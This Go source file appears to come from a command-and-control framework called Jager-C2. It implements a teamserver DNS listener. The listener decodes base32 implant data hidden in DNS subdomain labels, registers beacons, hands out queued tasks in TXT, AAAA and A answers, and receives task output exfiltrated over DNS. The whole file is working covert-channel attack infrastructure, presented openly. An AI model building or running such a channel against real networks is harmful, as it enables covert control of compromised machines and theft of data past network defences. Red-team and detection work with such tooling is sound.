package listeners

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"sync"

	"github.com/0xhackerfren/Jager-C2/teamserver/internal/crypto"
	pb "github.com/0xhackerfren/Jager-C2/teamserver/proto/jagerpb"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/sessions"
	"go.uber.org/zap"
)

// DNSListener implements C2 over DNS using TXT, AAAA, and A records.
// Data is encoded in subdomain labels (requests) and DNS answers (responses).
type DNSListener struct {
	id       string
	cfg      *pb.ListenerConfig
	sessions *sessions.Manager
	tasks    TaskQueue
	builds   BuildStore
	logger   *zap.Logger

	conn     *net.UDPConn
	done     chan struct{}
	wg       sync.WaitGroup

	mu       sync.RWMutex
	pending  map[string][]byte // session_id -> pending response data
}

func NewDNSListener(cfg *pb.ListenerConfig, sess *sessions.Manager, tq TaskQueue, bs BuildStore, logger *zap.Logger) (*DNSListener, error) {
	return &DNSListener{
		id:       cfg.Id,
		cfg:      cfg,
		sessions: sess,
		tasks:    tq,
		builds:   bs,
		logger:   logger.Named("dns"),
		done:     make(chan struct{}),
		pending:  make(map[string][]byte),
	}, nil
}

func (l *DNSListener) Start() error {
	addr := fmt.Sprintf("%s:%d", l.cfg.BindHost, l.cfg.BindPort)
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return fmt.Errorf("resolve UDP addr: %w", err)
	}

	l.conn, err = net.ListenUDP("udp", udpAddr)
	if err != nil {
		return fmt.Errorf("listen UDP: %w", err)
	}

	go l.serve()
	l.logger.Info("DNS listener started", zap.String("addr", addr))
	return nil
}

func (l *DNSListener) Stop() error {
	close(l.done)
	if l.conn != nil {
		l.conn.Close()
	}
	l.wg.Wait()
	return nil
}

func (l *DNSListener) ID() string {
	return l.id
}

func (l *DNSListener) Config() *pb.ListenerConfig {
	return l.cfg
}

func (l *DNSListener) serve() {
	buf := make([]byte, 4096)
	for {
		select {
		case <-l.done:
			return
		default:
		}

		n, raddr, err := l.conn.ReadFromUDP(buf)
		if err != nil {
			select {
			case <-l.done:
				return
			default:
				l.logger.Error("read UDP error", zap.Error(err))
				continue
			}
		}

		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		l.wg.Add(1)
		go func() {
			defer l.wg.Done()
			l.handlePacket(pkt, raddr)
		}()
	}
}

// handlePacket processes a raw DNS packet.
// Format: standard DNS query where the subdomain encodes C2 data.
// Encoding: <base32_data>.<session_id_short>.<c2_domain>
func (l *DNSListener) handlePacket(data []byte, raddr *net.UDPAddr) {
	if len(data) < 12 {
		return
	}

	// Parse DNS header
	txID := uint16(data[0])<<8 | uint16(data[1])
	flags := uint16(data[2])<<8 | uint16(data[3])

	// Only process queries (QR bit = 0)
	if flags&0x8000 != 0 {
		return
	}

	qdcount := uint16(data[4])<<8 | uint16(data[5])
	if qdcount == 0 {
		return
	}

	// Parse question section to extract query name
	qname, qtype, offset := l.parseQuestion(data, 12)
	if qname == "" {
		return
	}

	// Extract C2 data from subdomain labels
	response := l.processQuery(qname, qtype)

	// Build and send DNS response
	resp := l.buildResponse(txID, qname, qtype, response, data[:offset], raddr)
	l.conn.WriteToUDP(resp, raddr)
}

func (l *DNSListener) parseQuestion(data []byte, offset int) (string, uint16, int) {
	var labels []string
	for offset < len(data) {
		length := int(data[offset])
		if length == 0 {
			offset++
			break
		}
		if offset+1+length > len(data) {
			return "", 0, offset
		}
		labels = append(labels, string(data[offset+1:offset+1+length]))
		offset += 1 + length
	}

	qtype := uint16(0)
	if offset+2 <= len(data) {
		qtype = uint16(data[offset])<<8 | uint16(data[offset+1])
		offset += 4 // skip qtype + qclass
	}

	return strings.Join(labels, "."), qtype, offset
}

// processQuery extracts session data from DNS query and returns response bytes
func (l *DNSListener) processQuery(qname string, qtype uint16) []byte {
	dnsCfg := l.cfg.GetDns()
	if dnsCfg == nil {
		return nil
	}

	domain := dnsCfg.Domain
	if domain == "" {
		return nil
	}

	suffix := "." + domain
	if !strings.HasSuffix(qname, suffix) {
		return nil
	}
	encoded := strings.TrimSuffix(qname, suffix)

	parts := strings.Split(encoded, ".")
	if len(parts) < 2 {
		return nil
	}

	sessionPrefix := parts[len(parts)-1]
	msgType := parts[len(parts)-2]
	dataLabels := parts[:len(parts)-2]

	var decodedData []byte
	if len(dataLabels) > 0 {
		encodedData := strings.Join(dataLabels, "")
		if encodedData != "" && encodedData != "ping" {
			var err error
			decodedData, err = base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(encodedData))
			if err != nil {
				l.logger.Debug("base32 decode failed", zap.Error(err))
				return l.ackBytes()
			}
		}
	}

	sessionID := l.resolveSessionID(sessionPrefix)

	switch msgType {
	case "r":
		l.handleDNSRegister(sessionPrefix, decodedData)
		return l.ackBytes()
	case "c":
		if sessionID != "" {
			return l.handleDNSCheckin(sessionID)
		}
		return l.ackBytes()
	case "d":
		if sessionID != "" {
			l.handleDNSResult(sessionID, decodedData)
		}
		return l.ackBytes()
	case "poll":
		if sessionID != "" {
			return l.handleDNSCheckin(sessionID)
		}
		return nil
	default:
		return nil
	}
}

func (l *DNSListener) ackBytes() []byte {
	return []byte{10, 0, 0, 1}
}

func (l *DNSListener) resolveSessionID(prefix string) string {
	if prefix == "" {
		return ""
	}
	if _, err := l.sessions.GetSession(prefix); err == nil {
		return prefix
	}
	for _, s := range l.sessions.GetSessions(true) {
		if strings.HasPrefix(s.Id, prefix) {
			return s.Id
		}
	}
	for _, b := range l.sessions.GetBeacons(true) {
		if strings.HasPrefix(b.Id, prefix) {
			return b.Id
		}
	}
	return prefix
}

func (l *DNSListener) handleDNSRegister(sessionPrefix string, data []byte) {
	var reg struct {
		pb.ImplantRegistration
		BuildToken string `json:"build_token"`
	}
	if err := json.Unmarshal(data, &reg); err != nil {
		l.logger.Debug("DNS register JSON parse failed", zap.Error(err))
		return
	}
	if reg.BuildId == "" || reg.BuildToken == "" {
		return
	}
	if !crypto.ValidateBuildToken(reg.BuildId, reg.BuildToken) {
		return
	}
	if reg.ImplantId == "" {
		reg.ImplantId = sessionPrefix
	}
	reg.Transport = pb.Transport_TRANSPORT_DNS
	l.sessions.RegisterBeacon(&reg.ImplantRegistration, 30, 20)
	l.logger.Info("DNS registration", zap.String("session_id", reg.ImplantId))
}

func (l *DNSListener) handleDNSCheckin(sessionID string) []byte {
	l.sessions.Checkin(sessionID)
	l.tasks.RedeliverSentTasks(sessionID)

	pending := l.tasks.Dequeue(sessionID, 10)
	type taskPayload struct {
		ID   string `json:"id"`
		Type int32  `json:"type"`
		Data string `json:"data,omitempty"`
	}
	payloads := make([]taskPayload, 0, len(pending))
	for _, t := range pending {
		var dataB64 string
		if len(t.RequestData) > 0 {
			dataB64 = base64.StdEncoding.EncodeToString(t.RequestData)
		}
		payloads = append(payloads, taskPayload{
			ID:   t.Id,
			Type: int32(t.Type),
			Data: dataB64,
		})
	}

	resp, err := json.Marshal(map[string]interface{}{"tasks": payloads})
	if err != nil {
		return nil
	}
	return resp
}

func (l *DNSListener) handleDNSResult(sessionID string, data []byte) {
	var result struct {
		TaskID string `json:"task_id"`
		Output string `json:"output"`
		Error  string `json:"error"`
	}
	if err := json.Unmarshal(data, &result); err != nil {
		l.logger.Debug("DNS result parse failed", zap.Error(err))
		return
	}
	var output []byte
	if result.Output != "" {
		output, _ = base64.StdEncoding.DecodeString(result.Output)
	}
	l.tasks.Complete(result.TaskID, sessionID, output, result.Error)
	l.logger.Debug("DNS result received", zap.String("session", sessionID), zap.Int("size", len(output)))
}

// buildResponse constructs a DNS response packet
func (l *DNSListener) buildResponse(txID uint16, qname string, qtype uint16, responseData []byte, questionSection []byte, raddr *net.UDPAddr) []byte {
	var resp []byte

	respType := qtype
	if responseData != nil && qtype == 1 && len(responseData) > 4 {
		respType = 16 // upgrade to TXT for tasking payloads
	}

	// Header
	resp = append(resp, byte(txID>>8), byte(txID))
	resp = append(resp, 0x81, 0x80)
	resp = append(resp, 0x00, 0x01)
	ansCount := uint16(0)
	if responseData != nil {
		ansCount = 1
	}
	resp = append(resp, byte(ansCount>>8), byte(ansCount))
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, 0x00, 0x00)

	if len(questionSection) > 12 {
		resp = append(resp, questionSection[12:]...)
	}

	if responseData == nil {
		return resp
	}

	switch respType {
	case 16: // TXT - chunked into 255-byte strings per RFC 1035
		encoded := base64.StdEncoding.EncodeToString(responseData)
		chunks := chunkString(encoded, 253)
		resp = append(resp, l.encodeName(qname)...)
		resp = append(resp, 0x00, 0x10) // TYPE = TXT
		resp = append(resp, 0x00, 0x01) // CLASS = IN
		resp = append(resp, 0x00, 0x00, 0x00, 0x3C) // TTL = 60s

		rdataLen := 0
		for _, c := range chunks {
			rdataLen += 1 + len(c) // length byte + string
		}
		resp = append(resp, byte(rdataLen>>8), byte(rdataLen))
		for _, c := range chunks {
			resp = append(resp, byte(len(c)))
			resp = append(resp, []byte(c)...)
		}

	case 28: // AAAA
		if len(responseData) >= 16 {
			resp = append(resp, l.encodeName(qname)...)
			resp = append(resp, 0x00, 0x1C)
			resp = append(resp, 0x00, 0x01)
			resp = append(resp, 0x00, 0x00, 0x00, 0x3C)
			resp = append(resp, 0x00, 0x10)
			resp = append(resp, responseData[:16]...)
		}

	default: // A record ACK
		data := responseData
		if len(data) < 4 {
			data = l.ackBytes()
		}
		resp = append(resp, l.encodeName(qname)...)
		resp = append(resp, 0x00, 0x01)
		resp = append(resp, 0x00, 0x01)
		resp = append(resp, 0x00, 0x00, 0x00, 0x3C)
		resp = append(resp, 0x00, 0x04)
		resp = append(resp, data[:4]...)
	}

	_ = raddr
	return resp
}

func (l *DNSListener) encodeName(name string) []byte {
	var result []byte
	for _, label := range strings.Split(name, ".") {
		result = append(result, byte(len(label)))
		result = append(result, []byte(label)...)
	}
	result = append(result, 0x00)
	return result
}

// chunkString splits s into pieces of at most size bytes.
func chunkString(s string, size int) []string {
	if size <= 0 {
		return []string{s}
	}
	var chunks []string
	for len(s) > 0 {
		end := size
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[:end])
		s = s[end:]
	}
	if len(chunks) == 0 {
		chunks = []string{""}
	}
	return chunks
}
